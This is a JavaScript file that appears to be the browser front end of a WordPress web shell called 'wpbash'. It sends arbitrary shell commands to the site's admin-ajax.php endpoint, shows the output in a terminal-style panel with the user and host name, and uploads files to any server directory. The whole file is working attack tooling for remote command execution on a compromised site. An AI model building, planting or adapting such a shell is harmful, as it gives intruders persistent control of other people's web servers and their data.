(function() {
    'use strict';

    var pageURL = "/wp-admin/admin-ajax.php";
    var username = "";
    var hostname = "";
    var currentDir = "";
    var previousDir = "";
    var defaultDir = "";
    var commandHistory = [];
    var currentCommand = 0;
    var formElement = document.getElementById("wpbash_form");
    var inputTextElement = document.getElementById('wpbash_inputtext');
    var inputElement = document.getElementById("wpbash_input");
    var outputElement = document.getElementById("wpbash_output");
    var usernameElement = document.getElementById("wpbash_username");
    var uploadFormElement = document.getElementById("wpbash_upload");
    var fileBrowserElement = document.getElementById("wpbash_filebrowser");

    window.onload = (event) => getShellInfo();
    
    document.onkeydown = checkForArrowKeys;
    
    formElement.addEventListener("submit", function(event){
        event.preventDefault()
    });
    
    window.getShellInfo = function() {
        var request = new XMLHttpRequest();
        
        request.onreadystatechange = function() {
            if (request.readyState == XMLHttpRequest.DONE) {
                var parsedResponse = request.responseText.split("<br>");
                username = parsedResponse[0];
                hostname = parsedResponse[1];
                currentDir =  parsedResponse[2].replace(new RegExp("&sol;", "g"), "/");
                defaultDir = currentDir;
                usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                updateInputWidth();
            }
        };

        request.open("POST", pageURL, true);
        request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        request.send("cmd=whoami&hostname&pwd&action=wpbash");
    }
                
    window.sendCommand = function() {
        var request = new XMLHttpRequest();
        var command = inputTextElement.value;
        var originalCommand = command;
        var originalDir = currentDir;
        var cd = false;
        
        commandHistory.push(originalCommand);
        switchCommand(commandHistory.length);
        inputTextElement.value = "";

        var parsedCommand = command.split(" ");
        
        if (parsedCommand[0] == "cd") {
            cd = true;
            if (parsedCommand.length == 1) {
                command = "cd "+defaultDir+"; pwd";
            } else if (parsedCommand[1] == "-") {
                command = "cd "+previousDir+"; pwd";
            } else {
                command = "cd "+currentDir+"; "+command+"; pwd";
            }
            
        } else if (parsedCommand[0] == "clear") {
            outputElement.innerHTML = "";
            return false;
        } else if (parsedCommand[0] == "upload") {
            fileBrowserElement.click();
            return false;
        } else {
            command = "cd "+currentDir+"; " + command;
        }
        
        request.onreadystatechange = function() {
            if (request.readyState == XMLHttpRequest.DONE) {
                if (cd) {
                    var parsedResponse = request.responseText.split("<br>");
                    previousDir = currentDir;
                    currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
                    outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                    usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                } else {
                    outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
                    outputElement.scrollTop = outputElement.scrollHeight;
                } 
                updateInputWidth();
            }
        };

        request.open("POST", "", true);
        request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        request.send("cmd="+encodeURIComponent(command));
        return false;
    }
    
    window.uploadFile = function() {
        var formData = new FormData();
        formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
        formData.append('path', currentDir);
        
        var request = new XMLHttpRequest();
        
        request.onreadystatechange = function() {
            if (request.readyState == XMLHttpRequest.DONE) {
                outputElement.innerHTML += request.responseText+"<br>";
            }
        };

        request.open("POST", "", true);
        request.send(formData);
        outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
    }
    
    window.updateInputWidth = function() {
        inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
    }

    window.checkForArrowKeys = function(e) {
        e = e || window.event;

        if (e.keyCode == '38') {
            previousCommand();
        } else if (e.keyCode == '40') {
            nextCommand();
        }
    }
    
    window.previousCommand = function() {
        if (currentCommand != 0) {
            switchCommand(currentCommand-1);
        }
    }
    
    window.nextCommand = function() {
        if (currentCommand != commandHistory.length) {
            switchCommand(currentCommand+1);
        }
    }
    
    window.switchCommand = function(newCommand) {
        currentCommand = newCommand;

        if (currentCommand == commandHistory.length) {
            inputTextElement.value = "";
        } else {
            inputTextElement.value = commandHistory[currentCommand];
            setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
        }
    }

})();